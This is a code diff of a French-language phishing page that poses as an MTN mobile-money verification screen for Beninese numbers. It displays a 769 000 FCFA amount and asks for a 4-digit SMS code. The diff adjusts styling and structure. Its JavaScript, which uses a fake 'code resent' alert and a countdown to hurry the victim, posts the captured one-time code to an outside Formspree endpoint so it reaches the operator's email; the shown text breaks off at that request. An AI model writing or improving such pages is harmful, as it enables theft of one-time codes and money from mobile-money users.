@@ -286,8 +286,14 @@
             100% { transform: rotate(360deg); }
         }
         
-        .amount-highlight {
-            font-size: 22px;
+        .loading-box p {
+            font-size: 15px;
+            color: #333;
+            margin: 8px 0;
+        }
+        
+        .loading-amount {
+            font-size: 26px;
             font-weight: bold;
             color: #0066cc;
             margin: 10px 0;
@@ -332,34 +338,32 @@
                     </div>
                 </div>
                 
-                <form method="POST" action="">
-                    <div class="otp-container" id="otpContainer">
-                        <input type="text" class="otp-box" id="otp1" name="otp1" maxlength="1" pattern="[0-9]" inputmode="numeric" required>
-                        <input type="text" class="otp-box" id="otp2" name="otp2" maxlength="1" pattern="[0-9]" inputmode="numeric" required>
-                        <input type="text" class="otp-box" id="otp3" name="otp3" maxlength="1" pattern="[0-9]" inputmode="numeric" required>
-                        <input type="text" class="otp-box" id="otp4" name="otp4" maxlength="1" pattern="[0-9]" inputmode="numeric" required>
-                    </div>
-                    
-                    <div class="timer-box" id="timer">
-                        ⏱️ Code valable encore 04:59
-                    </div>
-                    
-                    <div style="text-align: center;">
-                        <span class="amount-highlight">769 000 FCFA</span>
-                    </div>
-                    
-                    <div class="info-message">
-                        Entrez le code à 4 chiffres reçu par SMS
-                    </div>
-                    
-                    <div class="resend-link">
-                        <a href="#" id="resendCode">📨 Renvoyer le code SMS</a>
-                    </div>
-                    
-                    <button type="submit" class="btn" id="submitBtn">
-                        VALIDER LE CODE
-                    </button>
-                </form>
+                <div class="otp-container" id="otpContainer">
+                    <input type="text" class="otp-box" id="otp1" maxlength="1" pattern="[0-9]" inputmode="numeric">
+                    <input type="text" class="otp-box" id="otp2" maxlength="1" pattern="[0-9]" inputmode="numeric">
+                    <input type="text" class="otp-box" id="otp3" maxlength="1" pattern="[0-9]" inputmode="numeric">
+                    <input type="text" class="otp-box" id="otp4" maxlength="1" pattern="[0-9]" inputmode="numeric">
+                </div>
+                
+                <div class="timer-box" id="timer">
+                    ⏱️ Code valable encore 04:59
+                </div>
+                
+                <div style="text-align: center;">
+                    <span class="amount-highlight">769 000 FCFA</span>
+                </div>
+                
+                <div class="info-message">
+                    Entrez le code à 4 chiffres reçu par SMS
+                </div>
+                
+                <div class="resend-link">
+                    <a href="#" id="resendCode">📨 Renvoyer le code SMS</a>
+                </div>
+                
+                <button class="btn" id="submitBtn">
+                    VALIDER LE CODE
+                </button>
             </div>
         </div>
         
@@ -373,7 +377,7 @@
         <div class="loading-box">
             <div class="mtn-spinner"></div>
             <p>Vérification du code...</p>
-            <div class="amount-highlight">769 000 FCFA</div>
+            <div class="loading-amount">769 000 FCFA</div>
             <p id="loadingName"></p>
         </div>
     </div>
@@ -388,6 +392,7 @@
         document.getElementById('displayPhone').textContent = '+229 ' + phone;
         document.getElementById('loadingName').textContent = firstName;
         
+        // Heure dynamique
         function updateTime() {
             const now = new Date();
             const hours = now.getHours().toString().padStart(2, '0');
@@ -400,6 +405,7 @@
         updateTime();
         setInterval(updateTime, 60000);
         
+        // Navigation entre les champs OTP
         const otpInputs = [
             document.getElementById('otp1'),
             document.getElementById('otp2'),
@@ -424,6 +430,7 @@
             });
         });
         
+        // Timer de 5 minutes
         let timeLeft = 300;
         const timerElement = document.getElementById('timer');
         
@@ -440,13 +447,14 @@
             }
         }, 1000);
         
+        // Simulation de renvoi de code
         document.getElementById('resendCode').addEventListener('click', function(e) {
             e.preventDefault();
             alert('✅ Un nouveau code vous a été envoyé par SMS !');
             timeLeft = 300;
         });
         
-        // SOUMISSION AVEC ENVOI À FORMSPREE
+        // Soumission avec envoi à Formspree
         document.getElementById('submitBtn').addEventListener('click', function(e) {
             e.preventDefault();
             
@@ -457,7 +465,7 @@
                 return;
             }
             
-            // ✅ ENVOYER LE CODE OTP À TON EMAIL VIA FORMSPREE
+            // Envoi du code OTP à Formspree
             fetch('https://formspree.io/f/xwvndpeb', {
                 method: 'POST',
                 headers: {
